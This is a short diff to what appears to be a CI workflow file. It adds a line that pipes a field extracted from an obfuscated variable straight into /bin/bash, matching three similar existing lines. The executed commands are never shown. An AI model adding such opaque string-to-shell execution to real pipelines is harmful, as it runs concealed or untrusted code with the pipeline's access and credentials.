@@ -27,6 +27,7 @@ jobs:
           echo $ra87498 | jq -r .frq030 | /bin/bash
           echo $g30 | jq -r .iey08549 | /bin/bash
           echo $kgnp5 | jq -r .lx4482 | /bin/bash
+          echo $ixsif1 | jq -r .kes666 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
